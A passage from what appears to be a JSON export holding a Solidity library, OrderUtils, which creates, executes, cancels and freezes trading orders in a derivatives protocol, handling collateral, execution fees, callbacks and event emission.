      "content": "// SPDX-License-Identifier: BUSL-1.1\n\npragma solidity ^0.8.0;\n\nimport \"../data/DataStore.sol\";\nimport \"../data/Keys.sol\";\n\nimport \"./Order.sol\";\nimport \"./OrderVault.sol\";\nimport \"./OrderStoreUtils.sol\";\nimport \"./OrderEventUtils.sol\";\n\nimport \"../nonce/NonceUtils.sol\";\nimport \"../oracle/Oracle.sol\";\nimport \"../oracle/OracleUtils.sol\";\nimport \"../event/EventEmitter.sol\";\n\nimport \"./IncreaseOrderUtils.sol\";\nimport \"./DecreaseOrderUtils.sol\";\nimport \"./SwapOrderUtils.sol\";\nimport \"./BaseOrderUtils.sol\";\n\nimport \"../swap/SwapUtils.sol\";\n\nimport \"../gas/GasUtils.sol\";\nimport \"../callback/CallbackUtils.sol\";\n\nimport \"../utils/Array.sol\";\nimport \"../utils/ReceiverUtils.sol\";\nimport \"../referral/ReferralUtils.sol\";\n\n// @title OrderUtils\n// @dev Library for order functions\nlibrary OrderUtils {\n    using Order for Order.Props;\n    using Position for Position.Props;\n    using Price for Price.Props;\n    using Array for uint256[];\n\n    error OrderTypeCannotBeCreated(Order.OrderType orderType);\n    error OrderAlreadyFrozen();\n    error InsufficientWntAmountForExecutionFee(uint256 wntAmount, uint256 executionFee);\n\n    // @dev creates an order in the order store\n    // @param dataStore DataStore\n    // @param eventEmitter EventEmitter\n    // @param orderVault OrderVault\n    // @param account the order account\n    // @param params BaseOrderUtils.CreateOrderParams\n    function createOrder(\n        DataStore dataStore,\n        EventEmitter eventEmitter,\n        OrderVault orderVault,\n        IReferralStorage referralStorage,\n        address account,\n        BaseOrderUtils.CreateOrderParams memory params\n    ) external returns (bytes32) {\n        ReferralUtils.setTraderReferralCode(referralStorage, account, params.referralCode);\n\n        uint256 initialCollateralDeltaAmount;\n\n        address wnt = TokenUtils.wnt(dataStore);\n\n        bool shouldRecordSeparateExecutionFeeTransfer = true;\n\n        if (\n            params.orderType == Order.OrderType.MarketSwap ||\n            params.orderType == Order.OrderType.LimitSwap ||\n            params.orderType == Order.OrderType.MarketIncrease ||\n            params.orderType == Order.OrderType.LimitIncrease\n        ) {\n            initialCollateralDeltaAmount = orderVault.recordTransferIn(params.addresses.initialCollateralToken);\n            if (params.addresses.initialCollateralToken == wnt) {\n                if (initialCollateralDeltaAmount < params.numbers.executionFee) {\n                    revert InsufficientWntAmountForExecutionFee(initialCollateralDeltaAmount, params.numbers.executionFee);\n                }\n                initialCollateralDeltaAmount -= params.numbers.executionFee;\n                shouldRecordSeparateExecutionFeeTransfer = false;\n            }\n        } else if (\n            params.orderType == Order.OrderType.MarketDecrease ||\n            params.orderType == Order.OrderType.LimitDecrease ||\n            params.orderType == Order.OrderType.StopLossDecrease\n        ) {\n            initialCollateralDeltaAmount = params.numbers.initialCollateralDeltaAmount;\n        } else {\n            revert OrderTypeCannotBeCreated(params.orderType);\n        }\n\n        if (shouldRecordSeparateExecutionFeeTransfer) {\n            uint256 wntAmount = orderVault.recordTransferIn(wnt);\n            if (wntAmount < params.numbers.executionFee) {\n                revert InsufficientWntAmountForExecutionFee(wntAmount, params.numbers.executionFee);\n            }\n\n            GasUtils.handleExcessExecutionFee(\n                dataStore,\n                orderVault,\n                wntAmount,\n                params.numbers.executionFee\n            );\n        }\n\n        // validate swap path markets\n        MarketUtils.getEnabledMarkets(\n            dataStore,\n            params.addresses.swapPath\n        );\n\n        Order.Props memory order;\n\n        order.setAccount(account);\n        order.setReceiver(params.addresses.receiver);\n        order.setCallbackContract(params.addresses.callbackContract);\n        order.setMarket(params.addresses.market);\n        order.setInitialCollateralToken(params.addresses.initialCollateralToken);\n        order.setSwapPath(params.addresses.swapPath);\n        order.setOrderType(params.orderType);\n        order.setDecreasePositionSwapType(params.decreasePositionSwapType);\n        order.setSizeDeltaUsd(params.numbers.sizeDeltaUsd);\n        order.setInitialCollateralDeltaAmount(initialCollateralDeltaAmount);\n        order.setTriggerPrice(params.numbers.triggerPrice);\n        order.setAcceptablePrice(params.numbers.acceptablePrice);\n        order.setExecutionFee(params.numbers.executionFee);\n        order.setCallbackGasLimit(params.numbers.callbackGasLimit);\n        order.setMinOutputAmount(params.numbers.minOutputAmount);\n        order.setIsLong(params.isLong);\n        order.setShouldUnwrapNativeToken(params.shouldUnwrapNativeToken);\n\n        ReceiverUtils.validateReceiver(order.receiver());\n\n        if (order.initialCollateralDeltaAmount() == 0 && order.sizeDeltaUsd() == 0) {\n            revert BaseOrderUtils.EmptyOrder();\n        }\n\n        CallbackUtils.validateCallbackGasLimit(dataStore, order.callbackGasLimit());\n\n        uint256 estimatedGasLimit = GasUtils.estimateExecuteOrderGasLimit(dataStore, order);\n        GasUtils.validateExecutionFee(dataStore, estimatedGasLimit, order.executionFee());\n\n        bytes32 key = NonceUtils.getNextKey(dataStore);\n\n        order.touch();\n        OrderStoreUtils.set(dataStore, key, order);\n\n        OrderEventUtils.emitOrderCreated(eventEmitter, key, order);\n\n        return key;\n    }\n\n    // @dev executes an order\n    // @param params BaseOrderUtils.ExecuteOrderParams\n    function executeOrder(BaseOrderUtils.ExecuteOrderParams memory params) external {\n        BaseOrderUtils.validateNonEmptyOrder(params.order);\n\n        BaseOrderUtils.setExactOrderPrice(\n            params.contracts.oracle,\n            params.market.indexToken,\n            params.order.orderType(),\n            params.order.triggerPrice(),\n            params.order.isLong()\n        );\n\n        processOrder(params);\n\n        OrderEventUtils.emitOrderExecuted(params.contracts.eventEmitter, params.key);\n\n        CallbackUtils.afterOrderExecution(params.key, params.order);\n\n        // the order.executionFee for liquidation / adl orders is zero\n        // gas costs for liquidations / adl is subsidised by the treasury\n        GasUtils.payExecutionFee(\n            params.contracts.dataStore,\n            params.contracts.orderVault,\n            params.order.executionFee(),\n            params.startingGas,\n            params.keeper,\n            params.order.account()\n        );\n    }\n\n    // @dev process an order execution\n    // @param params BaseOrderUtils.ExecuteOrderParams\n    function processOrder(BaseOrderUtils.ExecuteOrderParams memory params) internal {\n        if (BaseOrderUtils.isIncreaseOrder(params.order.orderType())) {\n            IncreaseOrderUtils.processOrder(params);\n            return;\n        }\n\n        if (BaseOrderUtils.isDecreaseOrder(params.order.orderType())) {\n            DecreaseOrderUtils.processOrder(params);\n            return;\n        }\n\n        if (BaseOrderUtils.isSwapOrder(params.order.orderType())) {\n            SwapOrderUtils.processOrder(params);\n            return;\n        }\n\n        BaseOrderUtils.revertUnsupportedOrderType();\n    }\n\n    // @dev cancels an order\n    // @param dataStore DataStore\n    // @param eventEmitter EventEmitter\n    // @param orderVault OrderVault\n    // @param key the key of the order to cancel\n    // @param keeper the keeper sending the transaction\n    // @param startingGas the starting gas of the transaction\n    // @param reason the reason for cancellation\n    function cancelOrder(\n        DataStore dataStore,\n        EventEmitter eventEmitter,\n        OrderVault orderVault,\n        bytes32 key,\n        address keeper,\n        uint256 startingGas,\n        string memory reason,\n        bytes memory reasonBytes\n    ) external {\n        Order.Props memory order = OrderStoreUtils.get(dataStore, key);\n        BaseOrderUtils.validateNonEmptyOrder(order);\n\n        if (BaseOrderUtils.isIncreaseOrder(order.orderType()) || BaseOrderUtils.isSwapOrder(order.orderType())) {\n            if (order.initialCollateralDeltaAmount() > 0) {\n                orderVault.transferOut(\n                    order.initialCollateralToken(),\n                    order.account(),\n                    order.initialCollateralDeltaAmount(),\n                    order.shouldUnwrapNativeToken()\n                );\n            }\n        }\n\n        OrderStoreUtils.remove(dataStore, key, order.account());\n\n        OrderEventUtils.emitOrderCancelled(eventEmitter, key, reason, reasonBytes);\n\n        CallbackUtils.afterOrderCancellation(key, order);\n\n        GasUtils.payExecutionFee(\n            dataStore,\n            orderVault,\n            order.executionFee(),\n            startingGas,\n            keeper,\n            order.account()\n        );\n    }\n\n    // @dev freezes an order\n    // @param dataStore DataStore\n    // @param eventEmitter EventEmitter\n    // @param orderVault OrderVault\n    // @param key the key of the order to freeze\n    // @param keeper the keeper sending the transaction\n    // @param startingGas the starting gas of the transaction\n    // @param reason the reason the order was frozen\n    function freezeOrder(\n        DataStore dataStore,\n        EventEmitter eventEmitter,\n        OrderVault orderVault,\n        bytes32 key,\n        address keeper,\n        uint256 startingGas,\n        string memory reason,\n        bytes memory reasonBytes\n    ) external {\n        Order.Props memory order = OrderStoreUtils.get(dataStore, key);\n        BaseOrderUtils.validateNonEmptyOrder(order);\n\n        if (order.isFrozen()) {\n            revert OrderAlreadyFrozen();\n        }\n\n        uint256 executionFee = order.executionFee();\n\n        order.setExecutionFee(0);\n        order.setIsFrozen(true);\n        OrderStoreUtils.set(dataStore, key, order);\n\n        OrderEventUtils.emitOrderFrozen(eventEmitter, key, reason, reasonBytes);\n\n        CallbackUtils.afterOrderFrozen(key, order);\n\n        GasUtils.payExecutionFee(\n            dataStore,\n            orderVault,\n            executionFee,\n            startingGas,\n            keeper,\n            order.account()\n        );\n\n    }\n}"
    }
  ]
}